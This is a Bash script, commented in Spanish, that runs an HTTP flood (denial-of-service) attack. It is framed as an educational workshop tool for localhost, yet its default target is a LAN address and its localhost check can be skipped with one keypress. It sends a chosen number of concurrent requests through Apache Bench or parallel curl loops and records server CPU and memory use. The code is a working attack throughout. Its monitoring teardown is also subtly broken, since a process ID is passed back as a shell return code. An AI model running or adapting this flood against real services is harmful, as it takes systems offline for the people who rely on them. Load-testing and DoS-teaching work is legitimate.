#!/bin/bash

# HTTP Flood Attack Script - Solo para pruebas educativas en localhost
# USO: ./http-flood.sh [URL] [REQUESTS] [CONCURRENCY]

# Configuración por defecto
DEFAULT_URL="http://192.168.0.100:8080/ddos-workshop/heavy-operation.jsp"
DEFAULT_REQUESTS=1000
DEFAULT_CONCURRENCY=10

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Verificar que estamos en localhost
check_environment() {
    if [[ "$1" == *"localhost"* ]] || [[ "$1" == *"127.0.0.1"* ]]; then
        echo -e "${GREEN}✓ Entorno local detectado - OK para pruebas${NC}"
    else
        echo -e "${RED}⚠ ADVERTENCIA: Este script solo debe usarse en localhost${NC}"
        echo -e "${RED}URL proporcionada: $1${NC}"
        read -p "¿Continuar de todos modos? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Mostrar banner de advertencia
show_warning() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                     ADVERTENCIA DE SEGURIDAD                 ║"
    echo "║  ESTE SCRIPT ES SOLO PARA PRUEBAS EDUCATIVAS EN LOCALHOST    ║"
    echo "║  NUNCA LO EJECUTES CONTRA SISTEMAS EN PRODUCCIÓN             ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    sleep 2
}

# Función principal de ataque
http_flood() {
    local url=$1
    local requests=$2
    local concurrency=$3
    
    echo -e "${YELLOW}🎯 Iniciando HTTP Flood Attack...${NC}"
    echo "URL: $url"
    echo "Total Requests: $requests"
    echo "Concurrency: $concurrency"
    echo "Inicio: $(date)"
    echo
    
    # Usar Apache Bench para el ataque
    if command -v ab &> /dev/null; then
        echo -e "${GREEN}Usando Apache Bench (ab)${NC}"
        ab -n $requests -c $concurrency "$url" | grep -E "(Time taken|Requests per second|Transfer rate|Failed requests)"
    else
        echo -e "${YELLOW}Apache Bench no encontrado, usando curl alternativo${NC}"
        
        # Función para hacer requests en paralelo
        do_request() {
            local req_num=$1
            for ((i=1; i<=req_num; i++)); do
                curl -s -o /dev/null -w "Request $i: %{http_code} - %{time_total}s\n" "$url" &
            done
            wait
        }
        
        # Calcular requests por worker
        local requests_per_worker=$((requests / concurrency))
        local remaining_requests=$((requests % concurrency))
        
        echo "Ejecutando $concurrency workers con $requests_per_worker requests cada uno..."
        
        # Ejecutar workers
        for ((worker=1; worker<=concurrency; worker++)); do
            do_request $requests_per_worker &
        done
        
        # Requests restantes
        if [ $remaining_requests -gt 0 ]; then
            do_request $remaining_requests &
        fi
        
        wait
    fi
    
    echo
    echo -e "${GREEN}✅ HTTP Flood completado${NC}"
    echo "Fin: $(date)"
}

# Función de monitoreo de recursos
monitor_resources() {
    echo -e "${YELLOW}📊 Iniciando monitoreo de recursos...${NC}"
    
    # Monitorear en segundo plano
    {
        echo "Tiempo,CPU%,Memoria%,Requests"
        while true; do
            local cpu=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
            local mem=$(free | grep Mem | awk '{printf("%.1f", $3/$2 * 100.0)}')
            local requests=$(ps aux | grep -v grep | grep -c "curl\\|ab")
            echo "$(date +%H:%M:%S),$cpu,$mem,$requests"
            sleep 2
        done
    } > resource_monitor.csv &
    
    local monitor_pid=$!
    echo "Monitoreo ejecutándose (PID: $monitor_pid)"
    echo "Datos guardados en: resource_monitor.csv"
    
    return $monitor_pid
}

# Main script
main() {
    show_warning
    
    # Parámetros
    local URL=${1:-$DEFAULT_URL}
    local REQUESTS=${2:-$DEFAULT_REQUESTS}
    local CONCURRENCY=${3:-$DEFAULT_CONCURRENCY}
    
    check_environment "$URL"
    
    echo -e "${GREEN}Configuración del ataque:${NC}"
    echo "Target URL: $URL"
    echo "Total Requests: $REQUESTS"
    echo "Concurrency: $CONCURRENCY"
    echo
    
    # Iniciar monitoreo
    monitor_resources
    local monitor_pid=$?
    
    # Esperar un poco antes de empezar
    sleep 3
    
    # Ejecutar ataque
    http_flood "$URL" "$REQUESTS" "$CONCURRENCY"
    
    # Detener monitoreo
    kill $monitor_pid 2>/dev/null
    echo -e "${GREEN}📈 Datos de monitoreo guardados en: resource_monitor.csv${NC}"
    
    # Mostrar resumen
    echo
    echo -e "${YELLOW}📋 Resumen del ataque:${NC}"
    echo "URL: $URL"
    echo "Requests enviados: $REQUESTS"
    echo "Concurrencia máxima: $CONCURRENCY"
    echo "Tiempo: $(date)"
}

# Ejecutar script principal
main "$@"